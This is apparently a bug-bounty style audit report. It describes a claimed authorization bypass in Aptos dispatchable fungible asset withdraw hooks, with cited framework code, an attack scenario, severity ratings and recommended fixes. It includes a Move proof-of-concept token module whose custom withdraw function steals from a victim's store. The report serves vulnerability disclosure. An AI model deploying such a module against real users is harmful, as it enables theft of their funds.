# Audit Report

## Title
Authorization Bypass in Dispatchable Fungible Asset Custom Withdraw Functions Enables Cross-Store Theft

## Summary
A critical authorization bypass vulnerability exists in the dispatchable fungible asset system where custom withdraw functions receive a `TransferRef` scoped to the fungible asset type (metadata) rather than individual stores. This architectural flaw enables malicious custom withdraw functions to steal assets from any store holding the same fungible asset type, completely bypassing per-store authorization checks.

## Finding Description

The vulnerability arises from an architectural flaw in how `TransferRef` capabilities are scoped and passed to custom withdraw functions in the dispatchable fungible asset framework.

**Architecture Flow:**

During fungible asset creation with dispatch functions, the `TransferRef` is stored in a `TransferRefStore` resource at the metadata object address (the fungible asset type level), not at individual store addresses: [1](#0-0) 

When a withdrawal is initiated via `dispatchable_fungible_asset::withdraw`, the function performs authorization checks on the original `store` parameter through `withdraw_sanity_check` and `withdraw_permission_check`: [2](#0-1) 

The sanity check verifies that the signer owns the store being withdrawn from: [3](#0-2) 

However, after authorization passes, the function retrieves the metadata-scoped `TransferRef` using `borrow_transfer_ref` and passes it to the custom withdraw function: [4](#0-3) 

The `borrow_transfer_ref` function retrieves the `TransferRef` from the metadata address, not from the individual store: [5](#0-4) 

**Exploitation Mechanism:**

A malicious custom withdraw function can ignore the authorized `store` parameter and use `object::address_to_object<FungibleStore>()` to create references to victim stores. This function only checks for resource existence, not ownership: [6](#0-5) 

The malicious function can then call `fungible_asset::withdraw_with_ref()` on any victim's store. This function only validates that the `TransferRef`'s metadata matches the store's metadata—it does NOT verify store ownership: [7](#0-6) 

**Attack Scenario:**
1. Attacker deploys "MaliciousCoin" with custom withdraw function that ignores the `store` parameter
2. Victim receives 1000 MaliciousCoin into their store (via airdrop, DEX, or other means)
3. Attacker initiates withdrawal from their own store (authorization checks pass for attacker's store)
4. Malicious custom withdraw function creates reference to victim's store using `address_to_object<FungibleStore>(victim_address)`
5. Function calls `withdraw_with_ref(transfer_ref, victim_store, 1000)` 
6. The metadata match check passes (both stores hold MaliciousCoin)
7. Victim's 1000 tokens are stolen

This breaks the fundamental security invariant that only store owners can withdraw from their stores.

## Impact Explanation

**Critical Severity** - Loss of Funds (Category 1: up to $1,000,000 per Aptos Bug Bounty)

This vulnerability enables:
- **Direct theft of fungible assets** from any user holding a malicious dispatchable fungible asset
- **Unlimited scope**: Attacker can steal from all stores holding their malicious asset in a single transaction
- **No recovery mechanism**: Stolen funds cannot be recovered without a hardfork
- **Ecosystem-wide impact**: Undermines the fundamental security model of the fungible asset framework

The vulnerability aligns precisely with the Aptos Bug Bounty's Critical severity category for "Loss of Funds" as it enables direct, irreversible theft of tokens through a complete authorization bypass in a core framework module.

## Likelihood Explanation

**High Likelihood**

The attack is highly feasible because:
- **Low barrier to entry**: Any user can deploy Move modules with custom withdraw functions—no special permissions required
- **Simple execution**: Single transaction to steal funds once victims hold the asset
- **Easy victim acquisition**: Malicious assets can be distributed via airdrops, DEX listings, social media campaigns, or by exploiting user trust
- **No special privileges required**: No validator access, governance participation, or stake required
- **Inherent architectural flaw**: The vulnerability exists in the core design of dispatchable fungible assets, not in edge cases or race conditions

The only requirement is that victims must hold the malicious asset, which is trivially achievable through standard token distribution mechanisms commonly used in blockchain ecosystems.

## Recommendation

**Architectural Fix:**

The root cause is that `TransferRef` is scoped at the metadata level but authorization is checked at the store level. The fix requires one of the following approaches:

**Option 1: Store-scoped TransferRef (Preferred)**
- Modify the dispatchable fungible asset system to generate and pass store-specific `TransferRef` capabilities
- Each custom withdraw function should receive a `TransferRef` that can only operate on the authorized store
- This requires changes to the `TransferRef` structure to include store address validation

**Option 2: Additional Authorization in withdraw_with_ref**
- Modify `fungible_asset::withdraw_with_ref` to accept and validate a store address parameter
- Add a check that the function is only being called on the originally authorized store
- This would require passing the authorized store address through the dispatch chain

**Option 3: Restrict Custom Function Capabilities (Interim Mitigation)**
- Document that custom withdraw functions must not use `TransferRef` on any store other than the passed parameter
- Add runtime checks to detect misuse (though this is difficult to enforce at the Move VM level)
- This is not a complete fix but provides awareness

**Recommended Implementation (Option 1):**
Modify `TransferRef` to include store validation and update `withdraw_with_ref` to enforce it.

## Proof of Concept

```move
module attacker::malicious_coin {
    use aptos_framework::fungible_asset::{Self, TransferRef, FungibleAsset};
    use aptos_framework::object::{Self, Object, ConstructorRef};
    use aptos_framework::dispatchable_fungible_asset;
    use aptos_framework::function_info;
    use std::option;
    use std::signer;
    use std::string;

    public fun initialize(deployer: &signer, constructor_ref: &ConstructorRef) {
        let withdraw = function_info::new_function_info(
            deployer,
            string::utf8(b"malicious_coin"),
            string::utf8(b"malicious_withdraw"),
        );

        dispatchable_fungible_asset::register_dispatch_functions(
            constructor_ref,
            option::some(withdraw),
            option::none(),
            option::none(),
        );
    }

    // Malicious withdraw function that steals from victim
    public fun malicious_withdraw<T: key>(
        store: Object<T>,  // Authorized store (attacker's) - IGNORED
        amount: u64,       // Amount to withdraw
        transfer_ref: &TransferRef,  // Works on ANY store of same metadata
    ): FungibleAsset {
        // ATTACK: Ignore authorized 'store' parameter
        // Create reference to victim's store
        let victim_address = @0xVICTIM_ADDRESS_HERE;
        let victim_store = object::address_to_object<fungible_asset::FungibleStore>(victim_address);
        
        // Steal from victim instead of authorized store
        // This passes because TransferRef.metadata == victim_store.metadata
        fungible_asset::withdraw_with_ref(transfer_ref, victim_store, amount)
    }
}
```

**Test Scenario:**
1. Deploy malicious coin with custom withdraw function
2. Distribute to victims via airdrop
3. Call `dispatchable_fungible_asset::withdraw` on attacker's own store
4. Custom function steals from victim's store instead
5. Victim's funds are transferred to attacker

## Notes

This vulnerability represents a **fundamental architectural flaw** in the dispatchable fungible asset design. The separation between authorization scope (per-store) and capability scope (per-metadata) creates a privilege escalation path that cannot be mitigated without framework-level changes.

The vulnerability affects all dispatchable fungible assets and cannot be fixed by individual token implementations—it requires updates to the core framework modules in `aptos-move/framework/aptos-framework/sources/`.

### Citations

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L49-55)
```text
        let store_obj = &constructor_ref.generate_signer();
        move_to<TransferRefStore>(
            store_obj,
            TransferRefStore {
                transfer_ref: fungible_asset::generate_transfer_ref(constructor_ref),
            }
        );
```

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L76-77)
```text
        fungible_asset::withdraw_sanity_check(owner, store, false);
        fungible_asset::withdraw_permission_check(owner, store, amount);
```

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L82-87)
```text
            let fa = dispatchable_withdraw(
                store,
                amount,
                borrow_transfer_ref(store),
                func,
            );
```

**File:** aptos-move/framework/aptos-framework/sources/dispatchable_fungible_asset.move (L188-195)
```text
    inline fun borrow_transfer_ref<T: key>(metadata: Object<T>): &TransferRef {
        let metadata_addr = fungible_asset::store_metadata(metadata).object_address();
        assert!(
            exists<TransferRefStore>(metadata_addr),
            error::not_found(ESTORE_NOT_FOUND)
        );
        &borrow_global<TransferRefStore>(metadata_addr).transfer_ref
    }
```

**File:** aptos-move/framework/aptos-framework/sources/fungible_asset.move (L994-996)
```text
        assert!(
            store.owns(owner_address),
            error::permission_denied(ENOT_STORE_OWNER)
```

**File:** aptos-move/framework/aptos-framework/sources/fungible_asset.move (L1107-1111)
```text
        assert!(
            self.metadata == store_metadata(store),
            error::invalid_argument(ETRANSFER_REF_AND_STORE_MISMATCH)
        );
        unchecked_withdraw(store.object_address(), amount)
```

**File:** aptos-move/framework/aptos-framework/sources/object.move (L198-202)
```text
    public fun address_to_object<T: key>(object: address): Object<T> {
        assert!(exists<ObjectCore>(object), error::not_found(EOBJECT_DOES_NOT_EXIST));
        assert!(exists_at<T>(object), error::not_found(ERESOURCE_DOES_NOT_EXIST));
        Object<T> { inner: object }
    }
```
